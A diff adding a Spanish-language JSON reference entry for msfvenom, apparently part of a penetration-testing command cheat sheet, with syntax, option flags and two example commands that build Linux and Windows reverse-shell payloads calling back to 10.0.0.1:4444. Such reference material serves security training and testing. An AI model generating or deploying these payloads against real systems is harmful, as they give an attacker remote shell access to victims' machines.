@@ -1,0 +1,42 @@
+{
+  "id": "msfvenom",
+  "title": "msfvenom — Generador de payloads",
+  "description": "Crea payloads y shells reversas en multitud de formatos.",
+  "syntax": "msfvenom -p payload [opciones]",
+  "examples": [
+    {
+      "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf",
+      "desc": "Payload ELF con shell reversa."
+    },
+    {
+      "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o p.exe",
+      "desc": "Payload Windows."
+    }
+  ],
+  "options": [
+    {
+      "flag": "-p",
+      "desc": "Payload."
+    },
+    {
+      "flag": "LHOST",
+      "desc": "IP de escucha."
+    },
+    {
+      "flag": "LPORT",
+      "desc": "Puerto de escucha."
+    },
+    {
+      "flag": "-f",
+      "desc": "Formato."
+    },
+    {
+      "flag": "-o",
+      "desc": "Archivo de salida."
+    },
+    {
+      "flag": "-e",
+      "desc": "Encoder."
+    }
+  ]
+}
